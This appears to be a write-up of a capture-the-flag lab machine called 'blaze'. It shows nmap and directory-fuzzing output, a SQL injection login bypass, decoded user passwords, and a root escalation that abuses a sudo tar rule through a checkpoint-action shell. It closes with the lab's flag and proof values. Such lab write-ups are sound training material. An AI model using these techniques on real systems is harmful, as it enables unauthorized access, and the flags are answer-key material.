```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 23:01 CDT
Nmap scan report for 192.168.76.10
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 984e5de1e697296fd9e0d482a8f64f3f (RSA)
|   256 5723571ffd7706be256661146dae5e98 (ECDSA)
|_  256 c79baad5a6333591341eefcf61a8301c (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2023-04-10T04:02:45
|_Not valid after:  2123-03-17T04:02:45
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.93%T=SSL%I=7%D=4/9%Time=64338A7C%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,E45,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\
SF:x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS
SF:-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Conte
SF:nt-Type-Options:\x20nosniff\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<h
SF:ead>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>
SF:\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x2
SF:0\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font
SF:-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Ar
SF:ial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fo
SF:nt-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line
SF:-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20margin:\x200\x200\x2010px;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20@font-face\x20{\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20")%r(HTTPOptions,E45,"HTTP/1\.1\x20400\x20Bad\
SF:x20request\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-E
SF:ncoding:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Polic
SF:y:\x20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\n\r\n29\r\n<!
SF:DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x
SF:20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20\x20\x
SF:20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initia
SF:l-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x20\"Open\x2
SF:0Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x200\x2010p
SF:x;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:@font-face\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.49 seconds
                                                                 
```

Started fuzzing website
```
File found: /index.html - 200
Dir found: / - 200
Dir found: /img/ - 200
File found: /login.php - 200
Dir found: /icons/ - 403
Dir found: /css/ - 200
File found: /css/index.css - 200
File found: /css/style.css - 200
File found: /css/type.css - 200
Dir found: /js/ - 200
Dir found: /icons/small/ - 403
File found: /js/index.js - 200
File found: /logout.php - 302    
```


Recieved an error when testing SQL injection in the admin field.

Used `admin'-- -` in the login and was able to login to be greeted by two users with two base64 encoded fields.

```
Username

Password

james

Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=

cameron

dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

James - canttouchhhthiss@455152
Cameron - thisscanttbetouchedd@455152

SSH does not work as both users require public keys to login

I was able to login on port `9090` and it offers a remote terminal as James using the password above.

```
james@blaze:~$ sudo -l
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
james@blaze:~$ sudo /usr/bin/tar -czvf /tmp/backup.tar.gz --checkpoint-action=exec=sh whoami --checkpoint=1
/usr/bin/tar: whoami: Cannot stat: No such file or directory
# whoami
root
# ls
local.txt
# cd /root
# ls
flag2.txt  proof.txt  snap
# cat flag2.txt
RWFzdGVyRWdn
# cat proof.txt
3ee37060181c278aa6b11b674739b98b
```

Was able to execute commands as tar. Got root in terminal on web.